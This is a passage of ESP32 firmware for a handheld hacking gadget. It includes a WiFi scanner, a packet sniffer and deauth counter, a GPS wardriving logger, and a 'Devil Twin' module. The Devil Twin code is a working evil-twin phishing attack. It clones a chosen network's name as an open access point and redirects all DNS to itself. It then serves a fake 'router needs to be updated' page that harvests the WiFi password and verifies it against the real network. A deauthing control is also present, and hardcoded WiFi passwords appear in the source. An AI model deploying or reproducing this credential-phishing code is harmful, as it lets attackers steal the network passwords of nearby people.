      Serial.println(network.ssid);

      Serial.print("BSSID: ");
      for (int j = 0; j < 6; j++)
      {
        network.bssid[j] = WiFi.BSSID(i)[j];
        Serial.print(network.bssid[j], HEX);
        if (j < 5)
        {
          Serial.print(":");
        }
      }
      Serial.println();
      network.rssi = WiFi.RSSI(i);
      Serial.print("RSSI: ");
      Serial.println(network.rssi);

      network.ch = WiFi.channel(i);
      Serial.print("Channel: ");
      Serial.println(network.ch);

      _networks[i] = network;
    }
  }
}
void displayNetworkScan()
{
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setFont(u8g2_font_baby_tf); // Set to a small font

  // Display the title
  u8g2_for_adafruit_gfx.setCursor(0, 10);
  u8g2_for_adafruit_gfx.print("Networks Found:");

  // Iterate through the _networks array and display each SSID
  for (int i = 0; i < 16; ++i)
  {
    if (_networks[i].ssid == "")
    {
      break; // Stop if there are no more networks
    }

    // Truncate the SSID if it's too long
    String ssid = _networks[i].ssid;
    if (ssid.length() > 10)
    {
      ssid = ssid.substring(0, 10) + "...";
    }

    // Set cursor position for each network (10 pixels per line)
    int y = 22 + (i * 10);
    u8g2_for_adafruit_gfx.setCursor(0, y);
    u8g2_for_adafruit_gfx.print(ssid);

    // Display RSSI
    u8g2_for_adafruit_gfx.setCursor(60, y);
    u8g2_for_adafruit_gfx.print(_networks[i].rssi);
    u8g2_for_adafruit_gfx.print(" dBm");

    // Display channel
    u8g2_for_adafruit_gfx.setCursor(95, y);
    u8g2_for_adafruit_gfx.print("CH:");
    u8g2_for_adafruit_gfx.print(_networks[i].ch);

    // If the display area is exceeded, stop displaying
    if (y > 63)
    {
      break;
    }
  }
  display.display();
}

// Wifi Connect Credentials
const char *ssid = "thanos lives forever";
const char *password = "ntwatwa1990";
// Create a web server object
WebServer server(80);
bool serverRunning = false;
// Function to handle the root path (/)

void startServer()
{
  // Connect to WiFi
  Serial.print("Connecting to ");
  Serial.println(ssid);
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setFont(u8g2_font_baby_tf); // Set to a small font
  u8g2_for_adafruit_gfx.setCursor(0, 10);
  u8g2_for_adafruit_gfx.print(ssid);
  WiFi.begin(ssid, password);
  while (WiFi.status() != WL_CONNECTED)
  {
    delay(500);
    Serial.print(".");
    u8g2_for_adafruit_gfx.setCursor(0, 20);
    u8g2_for_adafruit_gfx.print(ssid);
  }
  Serial.println("");
  Serial.println("WiFi connected");
  Serial.print("IP address: ");
  Serial.println(WiFi.localIP());
  // Clear the display (assuming 'display' is a valid object)
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setCursor(0, 10);
  u8g2_for_adafruit_gfx.print("WiFi connected");
  u8g2_for_adafruit_gfx.setCursor(0, 20);
  u8g2_for_adafruit_gfx.print("IP address: ");
  u8g2_for_adafruit_gfx.print(WiFi.localIP());

  // Start the web server
  server.on("/", handleRoot);
  server.begin();
  serverRunning = true;
  Serial.println("Server started");
  u8g2_for_adafruit_gfx.setCursor(0, 30);
  u8g2_for_adafruit_gfx.print("Server started");
  // server.handleClient();
}

// SOFT AP credentials to create wifi network
const char *softAP = "mangubuttercream";
const char *softPass = "mango12345";
void startSoftAP()
{
  // Connect to WiFi
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setFont(u8g2_font_baby_tf); // Set to a small font
  Serial.print("Creating Soft AP:");
  Serial.println(softAP);
  Serial.println(softPass);
  u8g2_for_adafruit_gfx.setCursor(0, 10);
  u8g2_for_adafruit_gfx.print("Creating Soft Ap...");
  u8g2_for_adafruit_gfx.setCursor(0, 20);
  u8g2_for_adafruit_gfx.print(ssid);
  WiFi.softAP(softAP, softPass);
  IPAddress IP = WiFi.softAPIP();
  Serial.print("SOFT AP IP address: ");
  Serial.println(IP);

  Serial.println("");
  Serial.println("WiFi connected");
  Serial.print("IP address: ");
  Serial.println(WiFi.localIP());
  // Clear the display (assuming 'display' is a valid object)
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setCursor(0, 10);
  u8g2_for_adafruit_gfx.print("WiFi connected");
  u8g2_for_adafruit_gfx.setCursor(0, 30);
  u8g2_for_adafruit_gfx.print("IP address: ");
  u8g2_for_adafruit_gfx.print(WiFi.localIP());

  // Start the web server
  server.on("/", handleRoot);
  server.begin();
  serverRunning = true;
  Serial.println("Server started");
  u8g2_for_adafruit_gfx.print("Server started");
  // server.handleClient();
  display.display();
}

// This is the WEB UI for CypherBox
void handleRoot()
{
  server.send(200, "text/html", "<h1>Welcome to Cypher Box!</h1><br><h3>This is a simple web portal where you can acess your Cypher ^_^</h3>");
}
void handleStopServer()
{
  serverRunning = false;
  server.send(200, "text/html", "<h1>Server stopped.</h1>");
  server.stop();
  Serial.println("Server stopped");
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setCursor(0, 10);
  u8g2_for_adafruit_gfx.print("Web Server Stopped!");
  u8g2_for_adafruit_gfx.setCursor(0, 30);
  u8g2_for_adafruit_gfx.print("Press any key to go back.");
  display.display();
}
void handleStopAP()
{
  serverRunning = false;
  server.stop();
  WiFi.softAPdisconnect(true);
  Serial.println("Server stopped & soft AP turned off");
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setCursor(0, 10);
  u8g2_for_adafruit_gfx.print("Soft AP Stopped!");
  u8g2_for_adafruit_gfx.setCursor(0, 20);
  u8g2_for_adafruit_gfx.print("Press any key to go back.");
  display.display();
}
void printOnDisplay(String message)
{
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);

  // Set the box coordinates and size
  /*int16_t x1, y1;
      uint16_t w, h;
      display.getTextBounds(message, 0, 0, &x1, &y1, &w, &h);
      display.drawRect(x1 - 2, y1 - 2, w + 4, h + 4, SSD1306_WHITE);
      */
  display.println(message);
  display.display();
  // u8g2 addition
  /*
      display.clearDisplay()'
      u8g2_for_adafruit_gfx.setFont(u8g2_font_tom_thumb_4x6_mr); // Set back to small font
      u8g2_for_adafruit_gfx.setCursor(0, 0);
      u8g2_for_adafruit_gfx.print(message);
      display.display();
      */
}
// ***PACKET MONITOR START*** //

/* ===== functions ===== */
double getMultiplicator() {
  uint32_t maxVal = 1;
  for (int i = 0; i < MAX_X; i++) {
    if (pkts[i] > maxVal) maxVal = pkts[i];
  }
  if (maxVal > MAX_Y) return (double)MAX_Y / (double)maxVal;
  else return 1;
}

void setChannel(int newChannel) {
  ch = newChannel;
  if (ch > MAX_CH || ch < 1) ch = 1;

  preferences.begin("packetmonitor32", false);
  preferences.putUInt("channel", ch);
  preferences.end();

  esp_wifi_set_promiscuous(false);
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous_rx_cb(&wifi_promiscuous);
  esp_wifi_set_promiscuous(true);
}

bool setupSD() {
  if (!SD_MMC.begin()) {
    Serial.println("Card Mount Failed");
    return false;
  }

  uint8_t cardType = SD_MMC.cardType();

  if (cardType == CARD_NONE) {
    Serial.println("No SD_MMC card attached");
    return false;
  }

  Serial.print("SD_MMC Card Type: ");
  if (cardType == CARD_MMC) {
    Serial.println("MMC");
  } else if (cardType == CARD_SD) {
    Serial.println("SDSC");
  } else if (cardType == CARD_SDHC) {
    Serial.println("SDHC");
  } else {
    Serial.println("UNKNOWN");
  }

  uint64_t cardSize = SD_MMC.cardSize() / (1024 * 1024);
  Serial.printf("SD_MMC Card Size: %lluMB\n", cardSize);

  return true;
}

void wifi_promiscuous(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)pkt->rx_ctrl;

  if (type == WIFI_PKT_MGMT && (pkt->payload[0] == 0xA0 || pkt->payload[0] == 0xC0 )) deauths++;

  if (type == WIFI_PKT_MISC) return;             // wrong packet type
  if (ctrl.sig_len > SNAP_LEN) return;           // packet too long

  uint32_t packetLength = ctrl.sig_len;
  if (type == WIFI_PKT_MGMT) packetLength -= 4;  // fix for known bug in the IDF https://github.com/espressif/esp-idf/issues/886

  //Serial.print(".");
  tmpPacketCounter++;
  rssiSum += ctrl.rssi;

  if (useSD) sdBuffer.addPacket(pkt->payload, packetLength);
}

void draw() {
#ifdef USE_DISPLAY
  double multiplicator = getMultiplicator();
  int len;
  int rssi;

  if (pkts[MAX_X - 1] > 0) rssi = rssiSum / (int)pkts[MAX_X - 1];
  else rssi = rssiSum;

  display.fillScreen(SSD1306_BLACK); // Clear the screen
  display.setTextColor(SSD1306_WHITE); // Set text color to white

  display.setCursor(0, 0); // Set cursor position for left-aligned text
  display.print("CH:" + String(ch)+ " ");
  display.setCursor(30, 0); // Set cursor position for right-aligned text
  display.print("R:"+String(rssi));
  display.setCursor(65, 0); // Set cursor position for right-aligned text
  display.print("P:[" + String(tmpPacketCounter) + "] " + "D:" + String(deauths));
  display.print(useSD ? "SD" : "");

  display.setCursor(95, 0);  // Set cursor position for left-aligned text
  //display.print("Pkts:");

  display.drawLine(0, 63 - MAX_Y, MAX_X, 63 - MAX_Y, SSD1306_WHITE); // Add color to drawLine
  for (int i = 0; i < MAX_X; i++) {
    len = pkts[i] * multiplicator;
    display.drawLine(i, 63, i, 63 - (len > MAX_Y ? MAX_Y : len), SSD1306_WHITE);
    if (i < MAX_X - 1) pkts[i] = pkts[i + 1];
  }
  display.display();
#endif
}
void coreTask( void * p ) {

  uint32_t currentTime;

  while (true) {

    currentTime = millis();

    /* bit of spaghetti code, have to clean this up later :D */

    // check button
    if (digitalRead(BUTTON_PIN) == LOW) {
      if (buttonEnabled) {
        if (!buttonPressed) {
          buttonPressed = true;
          lastButtonTime = currentTime;
        } else if (currentTime - lastButtonTime >= 2000) {
          if (useSD) {
            useSD = false;
            sdBuffer.close(&SD_MMC);
            draw();
          } else {
            if (setupSD())
              sdBuffer.open(&SD_MMC);
            draw();
          }
          buttonPressed = false;
          buttonEnabled = false;
        }
      }
    } else {
      if (buttonPressed) {
        setChannel(ch + 1);
        draw();
      }
      buttonPressed = false;
      buttonEnabled = true;
    }

    // save buffer to SD
    if (useSD)
      sdBuffer.save(&SD_MMC);

    // draw Display
    if ( currentTime - lastDrawTime > 1000 ) {
      lastDrawTime = currentTime;
      // Serial.printf("\nFree RAM %u %u\n", heap_caps_get_minimum_free_size(MALLOC_CAP_8BIT), heap_caps_get_minimum_free_size(MALLOC_CAP_32BIT));// for debug purposes

      pkts[MAX_X - 1] = tmpPacketCounter;

      draw();

      Serial.println((String)pkts[MAX_X - 1]);

      tmpPacketCounter = 0;
      deauths = 0;
      rssiSum = 0;
    }

    // Serial input
    if (Serial.available()) {
      ch = Serial.readString().toInt();
      if (ch < 1 || ch > 14) ch = 1;
      setChannel(ch);
    }

  }

}

void initPacketMon() {

  // Settings
  preferences.begin("packetmonitor32", false);
  ch = preferences.getUInt("channel", 1);
  preferences.end();

  // System & WiFi
  nvs_flash_init();
  //tcpip_adapter_init(); // Add header file for this function: #include <esp_wifi.h>
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  ESP_ERROR_CHECK(esp_event_loop_create_default());
  ESP_ERROR_CHECK(esp_wifi_init(&cfg));
  //ESP_ERROR_CHECK(esp_wifi_set_country(WIFI_COUNTRY_EU));
  ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
  ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_NULL));
  ESP_ERROR_CHECK(esp_wifi_start());

  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);

  // SD card
  sdBuffer = Buffer();

  if (setupSD())
    sdBuffer.open(&SD_MMC);

  // I/O
  pinMode(BUTTON_PIN, INPUT_PULLUP);

  // display
#ifdef USE_DISPLAY
  //display.init();
  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C))
  { // Address 0x3C for 128x64
    Serial.println(F("SSD1306 allocation failed"));
    for (;;)
      ;
  }

/*#ifdef FLIP_DISPLAY
  display.flipScreenVertically();
#endif
*/

  /* show start screen */
  display.fillScreen(SSD1306_BLACK);
  display.setTextColor(SSD1306_WHITE);
  //display.setFont(FreeMonoBold9pt7b); // Assuming you are using the FreeMonoBold9pt7b font
  display.setCursor(6, 6); 
  display.print("PacketMonitor32");
  //display.setFont(FreeMonoBold9pt7b);
  display.setCursor(24, 34);
  display.print("Made with <3 by");
  display.setCursor(29, 44);
  display.print("@Spacehuhn");
  display.display();

  delay(1000);
#endif

  // second core
  xTaskCreatePinnedToCore(
    coreTask,               /* Function to implement the task */
    "coreTask",             /* Name of the task */
    2500,                   /* Stack size in words */
    NULL,                   /* Task input parameter */
    0,                      /* Priority of the task */
    NULL,                   /* Task handle. */
    RUNNING_CORE);          /* Core where the task should run */

  // start Wifi sniffer
  esp_wifi_set_promiscuous_rx_cb(&wifi_promiscuous);
  esp_wifi_set_promiscuous(true);
}
void runPacketMon() {
  vTaskDelay(portMAX_DELAY);
}




////WIFI_SNIFFER SETUP
#define LED_GPIO_PIN 26
#define WIFI_CHANNEL_SWITCH_INTERVAL (5000)
#define WIFI_CHANNEL_MAX (13)
uint8_t level = 0, channel = 1;

static wifi_country_t wifi_country = {.cc = "CN", .schan = 1, .nchan = 13}; // Most recent esp32 library struct

typedef struct
{
  unsigned frame_ctrl : 16;
  unsigned duration_id : 16;
  uint8_t addr1[6]; /* receiver address */
  uint8_t addr2[6]; /* sender address */
  uint8_t addr3[6]; /* filtering address */
  unsigned sequence_ctrl : 16;
  uint8_t addr4[6]; /* optional */
} wifi_ieee80211_mac_hdr_t;

typedef struct
{
  wifi_ieee80211_mac_hdr_t hdr;
  uint8_t payload[0]; /* network data ended with 4 bytes csum (CRC32) */
} wifi_ieee80211_packet_t;

// static esp_err_t event_handler(void *ctx, system_event_t *event);
static void wifi_sniffer_init(void);
static void wifi_sniffer_set_channel(uint8_t channel);
static const char *wifi_sniffer_packet_type2str(wifi_promiscuous_pkt_type_t type);
// static void wifi_sniffer_packet_handler(void *buff, wifi_promiscuous_pkt_type_t type);

/*esp_err_t event_handler(void *ctx, system_event_t *event)
  {
    return ESP_OK;
  }
  */
// gemini
static void event_handler(void *arg, esp_event_base_t event_base,
                          int32_t event_id, void *event_data)
{
  // Handle events here
}

void wifi_sniffer_init(void)
{
  nvs_flash_init();
  // tcpip_adapter_init();
  // ESP_ERROR_CHECK( esp_event_loop_init(event_handler, NULL) );
  // gemini
  ESP_ERROR_CHECK(esp_event_loop_create_default());
  ESP_ERROR_CHECK(esp_event_handler_register(WIFI_EVENT, ESP_EVENT_ANY_ID, &event_handler, NULL));
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  ESP_ERROR_CHECK(esp_wifi_init(&cfg));
  ESP_ERROR_CHECK(esp_wifi_set_country(&wifi_country)); /* set country for channel range [1, 13] */
  ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
  ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_NULL));
  ESP_ERROR_CHECK(esp_wifi_start());
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&wifi_sniffer_packet_handler);
}

void wifi_sniffer_set_channel(uint8_t channel)
{
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
}

const char *wifi_sniffer_packet_type2str(wifi_promiscuous_pkt_type_t type)
{
  switch (type)
  {
  case WIFI_PKT_MGMT:
    return "MGMT";
  case WIFI_PKT_DATA:
    return "DATA";
  default:
  case WIFI_PKT_MISC:
    return "MISC";
  }
}

void wifi_sniffer_packet_handler(void *buff, wifi_promiscuous_pkt_type_t type)
{
  if (!snifferRunning)
    return; // Skip packet processing if sniffer is paused
  if (type != WIFI_PKT_MGMT)
    return;

  const wifi_promiscuous_pkt_t *ppkt = (wifi_promiscuous_pkt_t *)buff;
  const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)ppkt->payload;
  const wifi_ieee80211_mac_hdr_t *hdr = &ipkt->hdr;

  String message = "PACKET TYPE=";
  message += wifi_sniffer_packet_type2str(type);
  message += "\nCHAN=";
  message += ppkt->rx_ctrl.channel;
  message += "\nRSSI=";
  message += ppkt->rx_ctrl.rssi;
  message += "\nA1=";
  message += String(hdr->addr1[0], HEX) + ":" + String(hdr->addr1[1], HEX) + ":" + String(hdr->addr1[2], HEX) + ":" + String(hdr->addr1[3], HEX) + ":" + String(hdr->addr1[4], HEX) + ":" + String(hdr->addr1[5], HEX);
  message += "\nA2=";
  message += String(hdr->addr2[0], HEX) + ":" + String(hdr->addr2[1], HEX) + ":" + String(hdr->addr2[2], HEX) + ":" + String(hdr->addr2[3], HEX) + ":" + String(hdr->addr2[4], HEX) + ":" + String(hdr->addr2[5], HEX);
  message += "\nA3=";
  message += String(hdr->addr3[0], HEX) + ":" + String(hdr->addr3[1], HEX) + ":" + String(hdr->addr3[2], HEX) + ":" + String(hdr->addr3[3], HEX) + ":" + String(hdr->addr3[4], HEX) + ":" + String(hdr->addr3[5], HEX);

  Serial.println(message);
  printOnDisplay(message); // Print on the display
}

// the loop function runs over and over again forever
void initWifiSniffer()
{
  // Serial.begin(115200);
  // delay(10);
  // initDisplay(); // Initialize the display
  wifi_sniffer_init();
  pinMode(LED_GPIO_PIN, OUTPUT);
}

void runWifiSniffer()
{
  static bool snifferRunning = true;
  if (isButtonPressed(HOME_BUTTON_PIN))
  {
    esp_wifi_set_promiscuous(false);
    currentState = STATE_MENU;
    // Clean up WiFi sniffer if necessary
    drawMenu();
    delay(500); // Debounce delay
    return;
  }
  if (isButtonPressed(SELECT_BUTTON_PIN))
  {
    snifferRunning = !snifferRunning;
    display.clearDisplay();
    display.setCursor(0, 0);
    display.println(snifferRunning ? "Sniffer Running" : "Sniffer Paused");
    display.display();
    delay(500); // Debounce delay
  }

  if (snifferRunning)
  {
    wifi_sniffer_init();
    vTaskDelay(WIFI_CHANNEL_SWITCH_INTERVAL / portTICK_PERIOD_MS);
    wifi_sniffer_set_channel(channel);
    channel = (channel % WIFI_CHANNEL_MAX) + 1;
  }
  else
  {
    vTaskDelay(100 / portTICK_PERIOD_MS); // Short delay when paused to prevent busy-waiting
  }
}

// START DEVIL TWIN //
// DEVIL_TWIN VARIABLE SETUP //
typedef struct
{
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
} _DevilNetwork;

const uint8_t DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
WebServer webServer(80);

_DevilNetwork _devilnetworks[16];
_DevilNetwork _selectedNetwork;
// uses clearArry()
String _correct = "";
String _tryPassword = "";
String bytesToStr(uint8_t *data, uint8_t len)
{
  String str = "";
  for (uint8_t i = 0; i < len; i++)
  {
    str += String(data[i], HEX);
    if (i < len - 1)
    {
      str += ":";
    }
  }
  return str;
}
void performDevilScan()
{
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0)
  {
    Serial.println("Scanned Networks:");
    for (int i = 0; i < n && i < 16; ++i)
    {
      _DevilNetwork devilnetwork;
      devilnetwork.ssid = WiFi.SSID(i);
      Serial.print("SSID: ");
      Serial.println(devilnetwork.ssid);

      Serial.print("BSSID: ");
      for (int j = 0; j < 6; j++)
      {
        devilnetwork.bssid[j] = WiFi.BSSID(i)[j];
        Serial.print(devilnetwork.bssid[j], HEX);
        if (j < 5)
        {
          Serial.print(":");
        }
      }
      Serial.println();

      devilnetwork.ch = WiFi.channel(i);
      Serial.print("Channel: ");
      Serial.println(devilnetwork.ch);

      _devilnetworks[i] = devilnetwork;
    }
  }
}

bool hotspot_active = false;
bool deauthing_active = false;

void handleResult()
{
  String html = "";
  if (WiFi.status() != WL_CONNECTED)
  {
    webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 3000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Wrong Password</h2><p>Please, try again.</p></body> </html>");
    Serial.println("Wrong password tried !");
  }
  else
  {
    webServer.send(200, "text/html", "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Good password</h2></body> </html>");
    hotspot_active = false;
    dnsServer.stop();
    int n = WiFi.softAPdisconnect(true);
    Serial.println(String(n));
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
    WiFi.softAP("DevilTwin", "12345678");
    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    _correct = "Successfully got password for: " + _selectedNetwork.ssid + " Password: " + _tryPassword;
    Serial.println("Good password was entered !");
    Serial.println(_correct);
  }
}

String _tempHTML = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                   "<style> .content {max-width: 500px;margin: auto;}table, th, td {border: 1px solid black;border-collapse: collapse;padding-left:10px;padding-right:10px;}</style>"
                   "</head><body><div class='content'>"
                   "<div><form style='display:inline-block;' method='post' action='/?deauth={deauth}'>"
                   "<button style='display:inline-block;'{disabled}>{deauth_button}</button></form>"
                   "<form style='display:inline-block; padding-left:8px;' method='post' action='/?hotspot={hotspot}'>"
                   "<button style='display:inline-block;'{disabled}>{hotspot_button}</button></form>"
                   "</div></br><table><tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>Select</th></tr>";

void handleIndex()
{
  if (webServer.hasArg("ap"))
  {
    for (int i = 0; i < 16; i++)
    {
      if (bytesToStr(_devilnetworks[i].bssid, 6) == webServer.arg("ap"))
      {
        _selectedNetwork = _devilnetworks[i];
      }
    }
  }

  if (webServer.hasArg("deauth"))
  {
    if (webServer.arg("deauth") == "start")
    {
      deauthing_active = true;
    }
    else if (webServer.arg("deauth") == "stop")
    {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot"))
  {
    if (webServer.arg("hotspot") == "start")
    {
      hotspot_active = true;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect(true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    else if (webServer.arg("hotspot") == "stop")
    {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect(true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP("DevilTwin", "12345678");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  if (hotspot_active == false)
  {
    String _html = _tempHTML;

    for (int i = 0; i < 16; ++i)
    {
      if (_devilnetworks[i].ssid == "")
      {
        break;
      }
      _html += "<tr><td>" + _devilnetworks[i].ssid + "</td><td>" + bytesToStr(_devilnetworks[i].bssid, 6) + "</td><td>" + String(_devilnetworks[i].ch) + "<td><form method='post' action='/?ap=" + bytesToStr(_devilnetworks[i].bssid, 6) + "'>";

      if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_devilnetworks[i].bssid, 6))
      {
        _html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
      }
      else
      {
        _html += "<button>Select</button></form></td></tr>";
      }
    }

    if (deauthing_active)
    {
      _html.replace("{deauth_button}", "Stop deauthing");
      _html.replace("{deauth}", "stop");
    }
    else
    {
      _html.replace("{deauth_button}", "Start deauthing");
      _html.replace("{deauth}", "start");
    }

    if (hotspot_active)
    {
      _html.replace("{hotspot_button}", "Stop EvilTwin");
      _html.replace("{hotspot}", "stop");
    }
    else
    {
      _html.replace("{hotspot_button}", "Start EvilTwin");
      _html.replace("{hotspot}", "start");
    }

    if (_selectedNetwork.ssid == "")
    {
      _html.replace("{disabled}", " disabled");
    }
    else
    {
      _html.replace("{disabled}", "");
    }

    _html += "</table>";

    if (_correct != "")
    {
      _html += "</br><h3>" + _correct + "</h3>";
    }

    _html += "</div></body></html>";
    webServer.send(200, "text/html", _html);
  }
  else
  {
    if (webServer.hasArg("password"))
    {
      _tryPassword = webServer.arg("password");
      WiFi.disconnect();
      WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
      webServer.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/result';}, 15000); </script></head><body><h2>Updating, please wait...</h2></body> </html>");
    }
    else
    {
      webServer.send(200, "text/html", "<!DOCTYPE html> <html><body><h2>Router '" + _selectedNetwork.ssid + "' needs to be updatedPassword:  ");
    }
  }
}
void initDevilTwin()
{
  WiFi.mode(WIFI_AP_STA);
  delay(3000);
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  WiFi.softAP("DevilTwin", "12345678");
  delay(3000);
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
  delay(3000);
  performDevilScan(); // Add this line to perform the network scan
  delay(3000);
  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  // webServer.on("/admin", handleAdmin);
  webServer.onNotFound(handleIndex);
  webServer.begin();
  delay(3000);
}
void runDevilTwin()
{
  while (true)
  {
    // Check if HOME_BUTTON is pressed
    if (isButtonPressed(HOME_BUTTON_PIN))
    {
      currentState = STATE_MENU;
      drawMenu();
      delay(500); // Debounce delay
      return;
    }

    webServer.handleClient();
    dnsServer.processNextRequest();
    delay(10);
  }
}

// *** GPS MODULES ***

// SETUP
// RTC setup
RTC_Millis rtc;
// Pin definitions for GPS module
static const int RXPin = 16, TXPin = 17;
static const uint32_t GPSBaud = 9600; // GPS module baud rate
#define SD_CS_PIN 5                   // Chip select pin for SD card
#define MIN_SATELLITES 4              // Minimum number of satellites for a valid GPS fix
#define PST_OFFSET -8                 // PST is UTC-8
// Objects for GPS, serial communication, display, and SD card
TinyGPSPlus gps;
HardwareSerial gpsSerial(1);
File csvFile;
// Counters for WiFi scans and networks found
int scanCount = 0;
int networkCount = 0;
// GPS FUNCTIONS
void displayGPSData()
{
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);
  display.print("Lat: ");
  display.println(gps.location.lat(), 6);
  display.print("Lng: ");
  display.println(gps.location.lng(), 6);
  display.print("Alt: ");
  display.println(gps.altitude.meters());
  display.print("Sat: ");
  display.println(gps.satellites.value());

  // Get the current time from RTC and display it
  DateTime now = rtc.now();
  char buffer[30];
  snprintf(buffer, sizeof(buffer), "%04d-%02d-%02d %02d:%02d:%02d", now.year(), now.month(), now.day(), now.hour(), now.minute(), now.second());
  display.print("Time: ");
  display.println(buffer);

  // Display the number of networks found and scan count
  display.print("Nets: ");
  display.println(networkCount);
  display.print("Scans: ");
  display.println(scanCount);

  display.display();
}

// Display a message while searching for GPS signal
void displaySearching()
{
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);
  display.println("Searching for GPS...");
  display.print("Satellites: ");
  display.println(gps.satellites.value());
  display.display();
}

// Display an error message on the OLED screen
void displayError(const char *error)
{
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);
  display.println(error);
  display.display();
}

// Initialize a new CSV file for storing WiFi scan results
bool initializeCSV()
{
  DateTime now = rtc.now();
  char filename[32];
  snprintf(filename, sizeof(filename), "/wigle_%04d%02d%02d_%02d%02d%02d.csv", now.year(), now.month(), now.day(), now.hour(), now.minute(), now.second());
  csvFile = SD.open(filename, FILE_WRITE);
  if (csvFile)
  {
    csvFile.println("BSSID,SSID,Capabilities,First timestamp seen,Channel,Frequency,RSSI,Latitude,Longitude,Altitude,Accuracy,RCOIs,MfgrId,Type");
    csvFile.close();
    return true;
  }
  return false;
}

// Scan for WiFi networks and store results in the CSV file
void scanWiFiNetworks()
{
  networkCount = WiFi.scanNetworks(); // Scan for WiFi networks
  scanCount++;                        // Increment scan count
  csvFile = SD.open("/wigle.csv", FILE_APPEND);
  if (csvFile)
  {
    for (int i = 0; i < networkCount; ++i)
    {
      writeNetworkData(i);
    }
    csvFile.close();
  }
  else
  {
    displayError("CSV Write Error");
  }

  // Print networks to serial monitor
  Serial.print("Scan #");
  Serial.println(scanCount);
  Serial.print("Networks found: ");
  Serial.println(networkCount);
  for (int i = 0; i < networkCount; ++i)
  {
    Serial.print("Network #");
    Serial.print(i + 1);
    Serial.print(": ");
    Serial.print(WiFi.SSID(i));
    Serial.print(" (");
    Serial.print(WiFi.RSSI(i));
    Serial.println(" dBm)");
  }
}

// Write network data to the CSV file
void writeNetworkData(int networkIndex)
{
  String bssid = WiFi.BSSIDstr(networkIndex);
  String ssid = WiFi.SSID(networkIndex);
  String capabilities = WiFi.encryptionType(networkIndex) == WIFI_AUTH_OPEN ? "Open" : "Secured";
  String timestamp = getLocalTimestamp();
  int channel = WiFi.channel(networkIndex);
  int frequency = 2400 + (channel - 1) * 5; // Assuming 2.4GHz WiFi
  int rssi = WiFi.RSSI(networkIndex);
  String latitude = String(gps.location.lat(), 6);
  String longitude = String(gps.location.lng(), 6);
  String altitude = String(gps.altitude.meters());
  String accuracy = String(gps.hdop.hdop());
  String rcois = "";  // Placeholder if RCOIs is not available
  String mfgrid = ""; // Placeholder if Manufacturer ID is not available
  String type = "WiFi";

  // Write network data to CSV file
  csvFile.print("\"" + bssid + "\",");
  csvFile.print("\"" + ssid + "\",");
  csvFile.print("\"" + capabilities + "\",");
  csvFile.print("\"" + timestamp + "\",");
  csvFile.print(channel);
  csvFile.print(",");
  csvFile.print(frequency);
  csvFile.print(",");
  csvFile.print(rssi);
  csvFile.print(",");
  csvFile.print(latitude);
  csvFile.print(",");
  csvFile.print(longitude);
